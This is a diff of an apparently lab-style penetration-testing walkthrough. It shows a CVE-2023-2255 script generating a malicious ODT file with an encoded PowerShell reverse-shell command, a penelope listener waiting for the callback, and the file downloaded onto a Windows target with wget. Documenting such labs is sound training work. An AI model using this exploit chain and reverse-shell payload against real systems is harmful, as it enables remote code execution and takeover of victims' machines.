@@ -731,6 +731,13 @@ python3 CVE-2023-2255.py --cmd 'cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIAB
 ```
 Ill make a malicious odt file using a rev shell from revshells.com with my IP and port
 
+```python
+penelope -p 1338           
+[+] Listening for reverse shells on 0.0.0.0:1338 -> 127.0.0.1 • 192.168.1.157 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+```
+Now ive set a listener
+
 Now i can use my session as `web_account` and wget the malicious odt
 
 ```python
@@ -740,5 +747,18 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 Now ill host the odt on my machine
 
 ```python
+PS C:\xampp\htdocs\internal\applications> wget http://10.10.14.90:8000/rce.odt -o rce.odt
+PS C:\xampp\htdocs\internal\applications> dir -force
 
+
+    Directory: C:\xampp\htdocs\internal\applications
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         5/12/2026   8:50 PM          31843 rce.odt                                                              
+
+
+PS C:\xampp\htdocs\internal\applications> 
 ```
+Now the file is there
